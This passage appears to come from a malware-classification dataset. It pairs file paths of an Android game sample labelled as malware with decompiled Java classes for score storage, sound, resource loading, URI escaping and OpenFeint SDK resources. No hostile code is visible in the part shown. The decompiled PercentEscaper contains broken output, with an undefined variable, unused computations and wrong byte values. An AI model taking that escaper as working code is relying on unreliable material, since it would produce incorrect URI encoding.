"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.lib\History.code","public class History {   private static final String CONSTANCE_FLAG_ClASSIC_SCORE=""score_classic"";   private static final String CONSTANCE_FLAG_NICKNAME=""nickname"";   private static final String CONSTANCE_FLAG_PLAYMUSIC=""playmusic"";   private static final String CONSTANCE_FLAG_SCORE=""score"";   private static final String CONSTANCE_FLAG_SMASH_SCORE=""score_smash"";   private static final String CONSTANCE_FLAG_SPECIAL_SCORE=""score_special"";   private static final String CONSTANCE_XML_NAME=""record"";   private static final String CONSTANT_FLAG_SHOWLEADER=""showleader"";   private static final String CONSTANT_FLAG_SHOWNOTICE=""shownotice"";   public static void writeSpecialModeScore(  Context context,  int score){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     mSharedPreferences.edit().putInt(CONSTANCE_FLAG_SPECIAL_SCORE,score).commit();     Log.e(""JIANGJIAN"",""writeSpecialModeScore="" + score);   }   public static int getSpecialModeScore(  Context context){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     int score=mSharedPreferences.getInt(CONSTANCE_FLAG_SPECIAL_SCORE,-1);     Log.e(""JIANGJIAN"",""getSpecialModeScore="" + score);     return score;   }   public static void writeSmashModeScore(  Context context,  int score){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     mSharedPreferences.edit().putInt(CONSTANCE_FLAG_SMASH_SCORE,score).commit();     Log.e(""JIANGJIAN"",""writeTimeModeScore="" + score);   }   public static int getSmashModeScore(  Context context){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     int score=mSharedPreferences.getInt(CONSTANCE_FLAG_SMASH_SCORE,-1);     Log.e(""JIANGJIAN"",""getTimeModeScore="" + score);     return score;   }   public static void writeTimeModeScore(  Context context,  int score){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     mSharedPreferences.edit().putInt(CONSTANCE_FLAG_SCORE,score).commit();     Log.e(""JIANGJIAN"",""writeTimeModeScore="" + score);   }   public static int getTimeModeScore(  Context context){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     int score=mSharedPreferences.getInt(CONSTANCE_FLAG_SCORE,-1);     Log.e(""JIANGJIAN"",""getTimeModeScore="" + score);     return score;   }   public static void writeClassicModeScore(  Context context,  int score){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     mSharedPreferences.edit().putInt(CONSTANCE_FLAG_ClASSIC_SCORE,score).commit();     Log.e(""JIANGJIAN"",""writeClassicModeScore="" + score);   }   public static int getClassicModeScore(  Context context){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     int score=mSharedPreferences.getInt(CONSTANCE_FLAG_ClASSIC_SCORE,-1);     Log.e(""JIANGJIAN"",""getClassicModeScore="" + score);     return score;   }   public static void writeNotice(  Context context,  int noticeFlag){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     mSharedPreferences.edit().putInt(CONSTANT_FLAG_SHOWNOTICE,noticeFlag).commit();   }   public static int getNotice(  Context context){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     int noticeFlag=mSharedPreferences.getInt(CONSTANT_FLAG_SHOWNOTICE,0);     return noticeFlag;   }   public static void writeNickName(  Context context,  String strNickName){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     mSharedPreferences.edit().putString(CONSTANCE_FLAG_NICKNAME,strNickName).commit();   }   public static String getNickName(  Context context){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     String strNickNameString=mSharedPreferences.getString(CONSTANCE_FLAG_NICKNAME,null);     return strNickNameString;   }   public static void writePlayMusic(  Context context,  int playMusic){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     mSharedPreferences.edit().putInt(CONSTANCE_FLAG_PLAYMUSIC,playMusic).commit();   }   public static int getPlayMusic(  Context context){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     int score=mSharedPreferences.getInt(CONSTANCE_FLAG_PLAYMUSIC,1);     return score;   }   public static void writeLeaderflag(  Context context,  int showleaderflag){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     mSharedPreferences.edit().putInt(CONSTANT_FLAG_SHOWLEADER,showleaderflag).commit();   }   public static int getLeaderflag(  Context context){     SharedPreferences mSharedPreferences=context.getSharedPreferences(CONSTANCE_XML_NAME,0);     int showleaderflag=mSharedPreferences.getInt(CONSTANT_FLAG_SHOWLEADER,1);     return showleaderflag;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.lib\ImageInfo.code","public static class ImageInfo {   public int[] data;   public int height;   public int width; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.lib\Log.code","public class Log {   static Boolean debugOpen=false;   public static void i(  String Tag,  String msg){     if (debugOpen.booleanValue()) {       android.util.Log.i(Tag,msg);     }   }   public static void d(  String tag,  String msg){     if (debugOpen.booleanValue()) {       android.util.Log.d(tag,msg);     }   }   public static void e(  String tag,  String msg){     if (debugOpen.booleanValue()) {       android.util.Log.e(tag,msg);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.lib\RawInfo.code","public static class RawInfo {   public byte[] data;   public int length; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.lib\ResourceDecoder.code","public class ResourceDecoder { public static class ImageInfo {     public int[] data;     public int height;     public int width;   } public static class RawInfo {     public byte[] data;     public int length;   }   public static ImageInfo decodeImage(  Context context,  int resId){     if (context == null) {       throw new IllegalArgumentException(""context can not be null"");     }     Log.e(""JIANGJIAN"",""decode image"");     ImageInfo info=null;     BitmapFactory.Options options=new BitmapFactory.Options();     options.inPreferredConfig=Bitmap.Config.ARGB_8888;     if (GL1Lib.nativeCheckMemoryAvalable() == 0) {       return null;     }     try {       Bitmap bitmap=BitmapFactory.decodeResource(context.getResources(),resId,options);       if (bitmap != null) {         ImageInfo info2=new ImageInfo();         try {           int[] pixels=new int[options.outWidth * options.outHeight];           bitmap.getPixels(pixels,0,options.outWidth,0,0,options.outWidth,options.outHeight);           info2.data=pixels;           info2.width=options.outWidth;           info2.height=options.outHeight;           info=info2;         }  catch (        Exception e) {           info=info2;           Log.e(""JIANGJIAN"",""no memory"");           return info;         }       }     }  catch (    Exception e2) {     }     return info;   }   public static RawInfo decodeRaw(  Context context,  int resId){     if (context == null) {       throw new IllegalArgumentException(""context can not be null"");     }     try {       InputStream is=context.getResources().openRawResource(resId);       RawInfo info=null;       try {         RawInfo info2=new RawInfo();         try {           byte[] buffer=new byte[1024];           ByteArrayOutputStream baos=new ByteArrayOutputStream(1024);           try {             for (int bytsRead=is.read(buffer); -1 != bytsRead; bytsRead=is.read(buffer)) {               baos.write(buffer,0,bytsRead);             }             try {               is.close();             }  catch (            Exception e) {             }           }  catch (          Exception e2) {             try {               is.close();             }  catch (            Exception e3) {             }           } catch (          Throwable th) {             try {               is.close();             }  catch (            Exception e4) {             }             throw th;           }           info2.data=baos.toByteArray();           info2.length=baos.size();           info=info2;         }  catch (        Exception e5) {           info=info2;           Log.e(""JIANGJIAN"",""no memory!"");           return info;         }       }  catch (      Exception e6) {       }       return info;     }  catch (    Exception e7) {       Log.i(""JIANGJIAN"",""Cant find resid"");       return null;     }   }   public static RawInfo decodeAssets(  Context context,  String fileName){     if (context == null) {       throw new IllegalArgumentException(""context can not be null"");     }     try {       InputStream is=context.getResources().getAssets().open(fileName);       RawInfo info=null;       try {         RawInfo info2=new RawInfo();         try {           byte[] buffer=new byte[1024];           ByteArrayOutputStream baos=new ByteArrayOutputStream(1024);           try {             for (int bytsRead=is.read(buffer); -1 != bytsRead; bytsRead=is.read(buffer)) {               baos.write(buffer,0,bytsRead);             }             try {               is.close();             }  catch (            Exception e) {             }           }  catch (          Exception e2) {             try {               is.close();             }  catch (            Exception e3) {             }           } catch (          Throwable th) {             try {               is.close();             }  catch (            Exception e4) {             }             throw th;           }           info2.data=baos.toByteArray();           info2.length=baos.size();           info=info2;         }  catch (        Exception e5) {           info=info2;           Log.e(""JIANGJIAN"",""no memory!"");           return info;         }       }  catch (      Exception e6) {       }       return info;     }  catch (    Exception e7) {       Log.i(""JIANGJIAN"",""fileName="" + fileName);       return null;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.lib\Sound.code","public class Sound {   private static final int MAX_SOUND_ID=6;   private static final int SOUND_ID_COMBO=3;   private static final int SOUND_ID_COUNTDOWN_TICK=6;   private static final int SOUND_ID_CRITIClE=12;   private static final int SOUND_ID_CUT_UP=2;   private static final int SOUND_ID_HITBOB=11;   private static final int SOUND_ID_LEVEL1_2=7;   private static final int SOUND_ID_LEVEL2_3=8;   private static final int SOUND_ID_LEVEL3_4=9;   private static final int SOUND_ID_LIGHTTINGFRUIT=10;   private static final int SOUND_ID_PROLOG=4;   private static final int SOUND_ID_SWORD=1;   private static final int SOUND_ID_TIME_UP=5;   private Context mContext;   private int streamVolume;   private HashMap<Integer,Integer> soundStreamMap=new HashMap<>();   private final int MAX_STREAM=100;   private final int SOUND_QUALITY=100;   private SoundPool soundPool=new SoundPool(100,3,100);   private HashMap<Integer,Integer> soundPoolMap=new HashMap<>(6);   public Sound(  Context context){     this.mContext=context;     loadSfx(R.raw.sword_ninjia,1);     loadSfx(R.raw.cut_up,2);     loadSfx(R.raw.combo,3);     loadSfx(R.raw.bgmusic_menue,4);     loadSfx(R.raw.time_up,5);     loadSfx(R.raw.time_count_down,6);     loadSfx(R.raw.l1_2,7);     loadSfx(R.raw.l2_3,8);     loadSfx(R.raw.l3_4,SOUND_ID_LEVEL3_4);     loadSfx(R.raw.lighting_fruit,SOUND_ID_LIGHTTINGFRUIT);     loadSfx(R.raw.hit_bomb,SOUND_ID_HITBOB);     loadSfx(R.raw.critical,SOUND_ID_CRITIClE);     AudioManager mgr=(AudioManager)context.getSystemService(""audio"");     this.streamVolume=mgr.getStreamVolume(3);   }   public final void loadSfx(  int raw,  int id){     this.soundPoolMap.put(Integer.valueOf(id),Integer.valueOf(this.soundPool.load(this.mContext,raw,id)));   }   public int play(  int sound,  int uLoop,  int volome){     if (4 == sound) {       return 0;     }     this.streamVolume=volome;     int soundId=this.soundPoolMap.get(Integer.valueOf(sound)).intValue();     int streamId=0;     if (this.soundStreamMap.containsKey(Integer.valueOf(soundId))) {       streamId=this.soundStreamMap.get(Integer.valueOf(soundId)).intValue();     }     if (streamId != 0) {       this.soundPool.stop(streamId);     }     int streamId2=this.soundPool.play(soundId,this.streamVolume,this.streamVolume,1,uLoop,1.0f);     this.soundStreamMap.put(Integer.valueOf(soundId),Integer.valueOf(streamId2));     return streamId2;   }   public final void pause(  int streamId){     this.soundPool.pause(streamId);   }   public final void resume(  int streamId){     this.soundPool.resume(streamId);   }   public final void stop(  int streamId){     this.soundPool.stop(streamId);   }   public final void release(){     this.soundPool.release();   }   public void playMusic(  MediaPlayer music,  boolean isloop){     if (music.isPlaying()) {       Log.i(""JIANGJIAN"",""playMusic return!"");       return;     }     music.stop();     music.setLooping(isloop);     try {       music.prepare();     }  catch (    IOException e) {       e.printStackTrace();     } catch (    IllegalStateException e2) {       e2.printStackTrace();     }     music.start();   }   public void stopMusic(  MediaPlayer music){     if (music != null) {       try {         music.stop();       }  catch (      IllegalStateException e) {       }     }   }   public void releaseMusic(  MediaPlayer music){     if (music != null) {       if (music.isPlaying()) {         music.stop();       }       music.release();     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.google.api.client.escape\CharEscapers.code","public final class CharEscapers {   private static final Escaper URI_ESCAPER=new PercentEscaper(PercentEscaper.SAFECHARS_URLENCODER,true);   private static final Escaper URI_PATH_ESCAPER=new PercentEscaper(PercentEscaper.SAFEPATHCHARS_URLENCODER,false);   private static final Escaper URI_QUERY_STRING_ESCAPER=new PercentEscaper(PercentEscaper.SAFEQUERYSTRINGCHARS_URLENCODER,false);   public static String escapeUri(  String value){     return URI_ESCAPER.escape(value);   }   public static String decodeUri(  String uri){     try {       return URLDecoder.decode(uri,""UTF-8"");     }  catch (    UnsupportedEncodingException e) {       throw new AssertionError(e);     }   }   public static String escapeUriPath(  String value){     return URI_PATH_ESCAPER.escape(value);   }   public static String escapeUriQuery(  String value){     return URI_QUERY_STRING_ESCAPER.escape(value);   }   private CharEscapers(){   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.google.api.client.escape\Escaper.code","public abstract class Escaper {   public abstract String escape(  String str); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.google.api.client.escape\PercentEscaper.code","public class PercentEscaper extends UnicodeEscaper {   public static final String SAFECHARS_URLENCODER=""-_.*"";   public static final String SAFEPATHCHARS_URLENCODER=""-_.!~*'()@:$&,;="";   public static final String SAFEQUERYSTRINGCHARS_URLENCODER=""-_.!~*'()@:$,;/?:"";   private final boolean plusForSpace;   private final boolean[] safeOctets;   private static final char[] URI_ESCAPED_SPACE={'+'};   private static final char[] UPPER_HEX_DIGITS=""0123456789ABCDEF"".toCharArray();   public PercentEscaper(  String safeChars,  boolean plusForSpace){     if (safeChars.matches("".*[0-9A-Za-z].*"")) {       throw new IllegalArgumentException(""Alphanumeric characters are always 'safe' and should not be explicitly specified"");     }     if (plusForSpace && safeChars.contains("" "")) {       throw new IllegalArgumentException(""plusForSpace cannot be specified when space is a 'safe' character"");     }     if (safeChars.contains(""%"")) {       throw new IllegalArgumentException(""The '%' character cannot be specified as 'safe'"");     }     this.plusForSpace=plusForSpace;     this.safeOctets=createSafeOctets(safeChars);   }   private static boolean[] createSafeOctets(  String safeChars){     int maxChar=122;     char[] safeCharArray=safeChars.toCharArray();     for (    char c : safeCharArray) {       maxChar=Math.max((int)c,maxChar);     }     boolean[] octets=new boolean[maxChar + 1];     for (int c2=48; c2 <= 57; c2++) {       octets[c2]=true;     }     for (int c3=65; c3 <= 90; c3++) {       octets[c3]=true;     }     for (int c4=97; c4 <= 122; c4++) {       octets[c4]=true;     }     for (    char c5 : safeCharArray) {       octets[c5]=true;     }     return octets;   }   @Override protected int nextEscapeIndex(  CharSequence csq,  int index,  int end){     while (index < end) {       char c=csq.charAt(index);       if (c >= this.safeOctets.length || !this.safeOctets[c]) {         break;       }       index++;     }     return index;   }   @Override public String escape(  String s){     int slen=s.length();     for (int index=0; index < slen; index++) {       char c=s.charAt(index);       if (c >= this.safeOctets.length || !this.safeOctets[c]) {         return escapeSlow(s,index);       }     }     return s;   }   @Override protected char[] escape(  int cp){     if (cp < this.safeOctets.length && this.safeOctets[cp]) {       return null;     }     if (cp == 32 && this.plusForSpace) {       return URI_ESCAPED_SPACE;     }     if (cp <= 127) {       char[] dest={'%',UPPER_HEX_DIGITS[cp >>> 4],UPPER_HEX_DIGITS[cp & 15]};       return dest;     }     if (cp <= 2047) {       char[] dest2={'%',UPPER_HEX_DIGITS[(cp >>> 4) | 12],UPPER_HEX_DIGITS[cp & 15],'%',UPPER_HEX_DIGITS[(cp & 3) | 8],UPPER_HEX_DIGITS[cp & 15]};       int cp2=cp >>> 4;       int cp3=cp2 >>> 2;       return dest2;     }     if (cp <= 65535) {       char[] dest3={'%','E',r1[cp >>> 2],'%',UPPER_HEX_DIGITS[(cp & 3) | 8],UPPER_HEX_DIGITS[cp & 15],'%',UPPER_HEX_DIGITS[(cp & 3) | 8],UPPER_HEX_DIGITS[cp & 15]};       int cp4=cp >>> 4;       int cp5=cp4 >>> 2;       int cp6=cp5 >>> 4;       char[] cArr=UPPER_HEX_DIGITS;       return dest3;     }     if (cp <= 1114111) {       char[] dest4={'%','F',UPPER_HEX_DIGITS[(cp >>> 2) & 7],'%',UPPER_HEX_DIGITS[(cp & 3) | 8],UPPER_HEX_DIGITS[cp & 15],'%',UPPER_HEX_DIGITS[(cp & 3) | 8],UPPER_HEX_DIGITS[cp & 15],'%',UPPER_HEX_DIGITS[(cp & 3) | 8],UPPER_HEX_DIGITS[cp & 15]};       int cp7=cp >>> 4;       int cp8=cp7 >>> 2;       int cp9=cp8 >>> 4;       int cp10=cp9 >>> 2;       int cp11=cp10 >>> 4;       return dest4;     }     throw new IllegalArgumentException(""Invalid unicode character value "" + cp);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.google.api.client.escape\Platform.code","final class Platform {   private static final ThreadLocal<char[]> DEST_TL=new ThreadLocal<char[]>(){     @Override public char[] initialValue(){       return new char[1024];     }   } ;   private Platform(){   }   public static char[] charBufferFromThreadLocal(){     return DEST_TL.get();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.google.api.client.escape\UnicodeEscaper.code","public abstract class UnicodeEscaper extends Escaper {   private static final int DEST_PAD=32;   @Override public abstract String escape(  String str);   protected abstract char[] escape(  int i);   protected abstract int nextEscapeIndex(  CharSequence charSequence,  int i,  int i2);   public final String escapeSlow(  String s,  int index){     int end=s.length();     char[] dest=Platform.charBufferFromThreadLocal();     int destIndex=0;     int unescapedChunkStart=0;     while (index < end) {       int cp=codePointAt(s,index,end);       if (cp < 0) {         throw new IllegalArgumentException(""Trailing high surrogate at end of input"");       }       char[] escaped=escape(cp);       int nextIndex=index + (Character.isSupplementaryCodePoint(cp) ? 2 : 1);       if (escaped != null) {         int charsSkipped=index - unescapedChunkStart;         int sizeNeeded=destIndex + charsSkipped + escaped.length;         if (dest.length < sizeNeeded) {           int destLength=(end - index) + sizeNeeded + 32;           dest=growBuffer(dest,destIndex,destLength);         }         if (charsSkipped > 0) {           s.getChars(unescapedChunkStart,index,dest,destIndex);           destIndex+=charsSkipped;         }         if (escaped.length > 0) {           System.arraycopy(escaped,0,dest,destIndex,escaped.length);           destIndex+=escaped.length;         }         unescapedChunkStart=nextIndex;       }       index=nextEscapeIndex(s,nextIndex,end);     }     int charsSkipped2=end - unescapedChunkStart;     if (charsSkipped2 > 0) {       int endIndex=destIndex + charsSkipped2;       if (dest.length < endIndex) {         dest=growBuffer(dest,destIndex,endIndex);       }       s.getChars(unescapedChunkStart,end,dest,destIndex);       destIndex=endIndex;     }     return new String(dest,0,destIndex);   }   protected static int codePointAt(  CharSequence seq,  int index,  int end){     if (index < end) {       int index2=index + 1;       char c1=seq.charAt(index);       if (c1 < 55296 || c1 > 57343) {         return c1;       }       if (c1 <= 56319) {         if (index2 == end) {           return -c1;         }         char c2=seq.charAt(index2);         if (Character.isLowSurrogate(c2)) {           return Character.toCodePoint(c1,c2);         }         throw new IllegalArgumentException(""Expected low surrogate but got char '"" + c2 + ""' with value ""+ ((int)c2)+ "" at index ""+ index2);       }       throw new IllegalArgumentException(""Unexpected low surrogate character '"" + c1 + ""' with value ""+ ((int)c1)+ "" at index ""+ (index2 - 1));     }     throw new IndexOutOfBoundsException(""Index exceeds specified range"");   }   private static char[] growBuffer(  char[] dest,  int index,  int size){     char[] copy=new char[size];     if (index > 0) {       System.arraycopy(dest,0,copy,0,index);     }     return copy;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\attr.code","public static final class attr { } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\color.code","public static final class color {   public static final int of_transparent=0x7f050000; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\Delegate.code","public static class Delegate {   public boolean canShowNotification(  Notification notification){     return true;   }   public void displayNotification(  Notification notification){   }   public void notificationWillShow(  Notification notification){   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\drawable.code","public static final class drawable {   public static final int frame_layout_shape=0x7f020000;   public static final int icon=0x7f020001;   public static final int of_achievement_icon_frame=0x7f020002;   public static final int of_achievement_icon_locked=0x7f020003;   public static final int of_achievement_icon_unlocked=0x7f020004;   public static final int of_achievement_notification_bkg=0x7f020005;   public static final int of_achievement_notification_locked=0x7f020006;   public static final int of_feint_points_white=0x7f020007;   public static final int of_icon_dashboard_exit=0x7f020008;   public static final int of_icon_dashboard_home=0x7f020009;   public static final int of_icon_dashboard_settings=0x7f02000a;   public static final int of_icon_highscore_notification=0x7f02000b;   public static final int of_ll_logo=0x7f02000c;   public static final int of_native_loader=0x7f02000d;   public static final int of_native_loader_frame=0x7f02000e;   public static final int of_native_loader_leaf=0x7f02000f;   public static final int of_native_loader_progress=0x7f020010;   public static final int of_native_loader_progress_01=0x7f020011;   public static final int of_native_loader_progress_02=0x7f020012;   public static final int of_native_loader_progress_03=0x7f020013;   public static final int of_native_loader_progress_04=0x7f020014;   public static final int of_native_loader_progress_05=0x7f020015;   public static final int of_native_loader_progress_06=0x7f020016;   public static final int of_native_loader_progress_07=0x7f020017;   public static final int of_native_loader_progress_08=0x7f020018;   public static final int of_native_loader_progress_09=0x7f020019;   public static final int of_native_loader_progress_10=0x7f02001a;   public static final int of_native_loader_progress_11=0x7f02001b;   public static final int of_native_loader_progress_12=0x7f02001c;   public static final int of_notification_bkg=0x7f02001d; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\id.code","public static final class id {   public static final int adsview=0x7f090001;   public static final int appIcon=0x7f090012;   public static final int exit_feint=0x7f090018;   public static final int frameLayout=0x7f09000b;   public static final int home=0x7f090016;   public static final int layout_main=0x7f090000;   public static final int nested_window_root=0x7f09000a;   public static final int of_achievement_icon=0x7f090003;   public static final int of_achievement_icon_frame=0x7f090004;   public static final int of_achievement_notification=0x7f090002;   public static final int of_achievement_progress_icon=0x7f090008;   public static final int of_achievement_score=0x7f090006;   public static final int of_achievement_score_icon=0x7f090007;   public static final int of_achievement_text=0x7f090005;   public static final int of_icon=0x7f09000e;   public static final int of_ll_logo_image=0x7f09000d;   public static final int of_text=0x7f09000f;   public static final int of_text1=0x7f090010;   public static final int of_text2=0x7f090011;   public static final int progress=0x7f090009;   public static final int progress_bar=0x7f090015;   public static final int progress_text=0x7f090013;   public static final int settings=0x7f090017;   public static final int title=0x7f090014;   public static final int web_view=0x7f09000c; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\layout.code","public static final class layout {   public static final int main=0x7f030000;   public static final int of_achievement_notification=0x7f030001;   public static final int of_native_loader=0x7f030002;   public static final int of_nested_window=0x7f030003;   public static final int of_simple_notification=0x7f030004;   public static final int of_two_line_notification=0x7f030005;   public static final int status_bar_ongoing_event_progress_bar=0x7f030006; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\menu.code","public static final class menu {   public static final int of_dashboard=0x7f080000; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\Notification.code","public abstract class Notification {   private static Delegate sDelegate=new Delegate();   public enum Category {  Foreground,   Login,   Challenge,   HighScore,   Leaderboard,   Achievement,   SocialNotification,   Presence,   Multiplayer;   public static Category[] valuesCustom(){     Category[] valuesCustom=values();     int length=valuesCustom.length;     Category[] categoryArr=new Category[length];     System.arraycopy(valuesCustom,0,categoryArr,0,length);     return categoryArr;   } }   public enum Type {  None,   Submitting,   Downloading,   Error,   Success,   NewResources,   UserPresenceOnLine,   UserPresenceOffline,   NewMessage,   Multiplayer,   NetworkOffline;   public static Type[] valuesCustom(){     Type[] valuesCustom=values();     int length=valuesCustom.length;     Type[] typeArr=new Type[length];     System.arraycopy(valuesCustom,0,typeArr,0,length);     return typeArr;   } }   public abstract Category getCategory();   public abstract String getText();   public abstract Type getType();   public abstract Map<String,Object> getUserData(); public static class Delegate {     public boolean canShowNotification(    Notification notification){       return true;     }     public void displayNotification(    Notification notification){     }     public void notificationWillShow(    Notification notification){     }   }   public static Delegate getDelegate(){     return sDelegate;   }   public static void setDelegate(  Delegate delegate){     sDelegate=delegate;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\OpenFeint.code","public class OpenFeint {   public static CurrentUser getCurrentUser(){     return OpenFeintInternal.getInstance().getCurrentUser();   }   public static boolean isUserLoggedIn(){     return OpenFeintInternal.getInstance().isUserLoggedIn();   }   public static void initialize(  Context ctx,  OpenFeintSettings settings,  OpenFeintDelegate delegate){     OpenFeintInternal.initialize(ctx,settings,delegate);   }   public static void initializeWithoutLoggingIn(  Context ctx,  OpenFeintSettings settings,  OpenFeintDelegate delegate){     OpenFeintInternal.initializeWithoutLoggingIn(ctx,settings,delegate);   }   public static void setDelegate(  OpenFeintDelegate delegate){     OpenFeintInternal.getInstance().setDelegate(delegate);   }   public static void login(){     OpenFeintInternal.getInstance().login(false);   }   public static boolean isNetworkConnected(){     return OpenFeintInternal.getInstance().isFeintServerReachable();   }   public static void userApprovedFeint(){     OpenFeintInternal.getInstance().userApprovedFeint();   }   public static void userDeclinedFeint(){     OpenFeintInternal.getInstance().userDeclinedFeint();   }   public static void logoutUser(){     OpenFeintInternal.getInstance().logoutUser(null);   }   public static void trySubmitOfflineData(){     OfflineSupport.trySubmitOfflineData();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\OpenFeintDelegate.code","public abstract class OpenFeintDelegate {   public void userLoggedIn(  CurrentUser user){   }   public void userLoggedOut(  User user){   }   public void onDashboardAppear(){   }   public void onDashboardDisappear(){   }   public boolean showCustomApprovalFlow(  Context ctx){     return false;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\OpenFeintSettings.code","public class OpenFeintSettings {   public static final String CloudStorageCompressionStrategyDefault=""CloudStorageCompressionStrategyDefault"";   public static final String CloudStorageCompressionStrategyLegacyHeaderlessCompression=""CloudStorageCompressionStrategyLegacyHeaderlessCompression"";   public static final String CloudStorageCompressionStrategyNoCompression=""CloudStorageCompressionStrategyNoCompression"";   public static final String RequestedOrientation=""RequestedOrientation"";   public static final String SettingCloudStorageCompressionStrategy=""SettingCloudStorageCompressionStrategy"";   public String id;   public String key;   public String name;   public String secret;   public Map<String,Object> settings;   public OpenFeintSettings(  String _name,  String _key,  String _secret,  String _id){     this.name=_name;     this.key=_key;     this.secret=_secret;     this.id=_id;     this.settings=new HashMap();   }   public OpenFeintSettings(  String _name,  String _key,  String _secret,  String _id,  Map<String,Object> _settings){     this.name=_name;     this.key=_key;     this.secret=_secret;     this.id=_id;     this.settings=_settings;   }   public void applyOverrides(  Properties settings){     if (settings != null) {       String property=settings.getProperty(""app-id"");       if (property != null) {         this.id=property;       }       String property2=settings.getProperty(""game-name"");       if (property2 != null) {         this.name=property2;       }       String property3=settings.getProperty(""app-key"");       if (property3 != null) {         this.key=property3;       }       String property4=settings.getProperty(""app-secret"");       if (property4 != null) {         this.secret=property4;       }     }   }   public void verify(){     String verificationError=null;     if (this.key == null) {       verificationError=OpenFeintInternal.getRString(com.panda.panzdfdgfhghad.R.string.of_key_cannot_be_null);     }  else     if (this.secret == null) {       verificationError=OpenFeintInternal.getRString(com.panda.panzdfdgfhghad.R.string.of_secret_cannot_be_null);     }  else     if (this.id == null) {       verificationError=OpenFeintInternal.getRString(com.panda.panzdfdgfhghad.R.string.of_id_cannot_be_null);     }  else     if (this.name == null) {       verificationError=OpenFeintInternal.getRString(com.panda.panzdfdgfhghad.R.string.of_name_cannot_be_null);     }     if (verificationError != null) {       OpenFeintInternal.log(""OpenFeintSettings"",verificationError);       OpenFeintInternal.getInstance().displayErrorDialog(verificationError);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.api\R.code","public final class R { public static final class attr {   } public static final class color {     public static final int of_transparent=0x7f050000;   } public static final class drawable {     public static final int frame_layout_shape=0x7f020000;     public static final int icon=0x7f020001;     public static final int of_achievement_icon_frame=0x7f020002;     public static final int of_achievement_icon_locked=0x7f020003;     public static final int of_achievement_icon_unlocked=0x7f020004;     public static final int of_achievement_notification_bkg=0x7f020005;     public static final int of_achievement_notification_locked=0x7f020006;     public static final int of_feint_points_white=0x7f020007;     public static final int of_icon_dashboard_exit=0x7f020008;     public static final int of_icon_dashboard_home=0x7f020009;     public static final int of_icon_dashboard_settings=0x7f02000a;     public static final int of_icon_highscore_notification=0x7f02000b;     public static final int of_ll_logo=0x7f02000c;     public static final int 